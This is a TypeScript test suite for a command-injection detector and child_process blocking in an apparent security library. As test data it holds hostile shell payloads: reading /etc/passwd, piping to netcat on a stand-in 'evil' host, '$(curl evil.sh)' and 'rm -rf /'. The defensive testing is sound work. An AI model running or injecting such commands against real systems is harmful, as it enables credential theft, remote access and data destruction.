import childProcess, { execSync as namedExecSync } from 'node:child_process';
import { promisify } from 'node:util';
import { beforeAll, describe, expect, it } from 'vitest';
import { createVigilo } from '../src/client.js';
import { runWithContext, type InputSources, type RequestContext } from '../src/rasp/context.js';
import { instrumentChildProcess } from '../src/rasp/child-process.js';
import { findCommandInjection, tokenizeShell } from '../src/rasp/shell.js';
import { VigiloBlockedError } from '../src/rasp/wrap.js';

beforeAll(() => {
  expect(instrumentChildProcess()).toBe(true);
});

function context(mode: 'monitor' | 'block', sources: InputSources): RequestContext {
  return createVigilo({ mode, flushIntervalMs: 0, send: async () => {} }).createContext(() => sources);
}

const input = (value: string, location = 'query.host') => ({ location, value });
const detects = (template: (v: string) => string, value: string) =>
  findCommandInjection(template(value), [input(value)]) !== undefined;

describe('tokenizeShell', () => {
  it('separa palavras, aspas, operadores, substituições e comentários', () => {
    const cmd = `ping -c 1 'a b' "c $(d)" ; echo \`x\` && ls > out # fim`;
    expect(tokenizeShell(cmd).map((t) => [t.kind, cmd.slice(t.start, t.end)])).toEqual([
      ['word', 'ping'],
      ['word', '-c'],
      ['word', '1'],
      ['squote', "'a b'"],
      ['dquote', '"c $(d)"'],
      ['operator', ';'],
      ['word', 'echo'],
      ['substitution', '`x`'],
      ['operator', '&&'],
      ['word', 'ls'],
      ['operator', '>'],
      ['word', 'out'],
      ['comment', '# fim'],
    ]);
  });
});

describe('findCommandInjection: detecção', () => {
  const ping = (v: string) => `ping -c 1 ${v}`;
  const quoted = (v: string) => `convert '${v}' out.png`;
  const dquoted = (v: string) => `grep "${v}" app.log`;

  it('encadeamento com ; && | e redirecionamento', () => {
    expect(detects(ping, '8.8.8.8; cat /etc/passwd')).toBe(true);
    expect(detects(ping, '8.8.8.8 && id')).toBe(true);
    expect(detects(ping, '8.8.8.8 | nc evil 1234')).toBe(true);
    expect(detects(ping, '8.8.8.8 > /tmp/x')).toBe(true);
  });

  it('substituição de comando, inclusive sozinha', () => {
    expect(detects(ping, '$(id)')).toBe(true);
    expect(detects(ping, '`id`')).toBe(true);
  });

  it('saída de aspas simples', () => {
    expect(detects(quoted, "a.png'; rm -rf / #")).toBe(true);
  });

  it('expansão dentro de aspas duplas', () => {
    expect(detects(dquoted, '$(curl evil.sh)')).toBe(true);
  });
});

describe('findCommandInjection: falsos positivos', () => {
  it('host, nome de arquivo com espaço e texto entre aspas simples', () => {
    expect(detects((v) => `ping -c 1 ${v}`, 'example.com')).toBe(false);
    expect(detects((v) => `ls ${v}`, 'meu arquivo.txt')).toBe(false);
    expect(detects((v) => `echo '${v}'`, 'a; b && c | d $(e) `f`')).toBe(false);
  });

  it('texto comum entre aspas duplas', () => {
    expect(detects((v) => `grep "${v}" app.log`, 'erro ao salvar pedido')).toBe(false);
  });

  it('entrada que não aparece no comando', () => {
    expect(findCommandInjection('ls -la', [input('; rm -rf /')])).toBeUndefined();
  });
});

describe('instrumentChildProcess', () => {
  const attack = { query: { name: 'mundo; echo injetado' } };

  it('em monitor registra e deixa executar', () => {
    const ctx = context('monitor', attack);
    const out = runWithContext(ctx, () => childProcess.execSync(`echo ola ${attack.query.name}`).toString());
    expect(out).toContain('injetado');
    expect(ctx.threats).toEqual([
      { type: 'cmdi', severity: 5, location: 'query.name', rule: 'rasp.cmdi.child_process', layer: 'rasp' },
    ]);
  });

  it('em block lança na chamada e o processo não é criado (exec, import nomeado, spawn com shell)', () => {
    const ctx = context('block', attack);
    const cmd = `echo ola ${attack.query.name}`;
    expect(() => runWithContext(ctx, () => childProcess.exec(cmd))).toThrow(VigiloBlockedError);
    expect(() => runWithContext(ctx, () => namedExecSync(cmd))).toThrow(VigiloBlockedError);
    expect(() =>
      runWithContext(ctx, () => childProcess.spawnSync('echo', ['ola', attack.query.name], { shell: true })),
    ).toThrow(VigiloBlockedError);
    expect(ctx.blocked).toBe(true);
  });

  it('promisify(exec) continua resolvendo { stdout, stderr } e é verificado', async () => {
    const execAsync = promisify(childProcess.exec);
    const clean = await runWithContext(context('block', { query: { name: 'mundo' } }), () => execAsync('echo ola mundo'));
    expect(clean.stdout.trim()).toBe('ola mundo');
    await expect(runWithContext(context('block', attack), () => execAsync(`echo ${attack.query.name}`))).rejects.toBeInstanceOf(
      VigiloBlockedError,
    );
  });

  it('sem shell, argumentos separados não são verificados', () => {
    const ctx = context('block', attack);
    const out = runWithContext(ctx, () => childProcess.execFileSync('echo', ['ola', attack.query.name]).toString());
    expect(out.trim()).toBe(`ola ${attack.query.name}`);
    expect(ctx.threats).toEqual([]);
  });
});
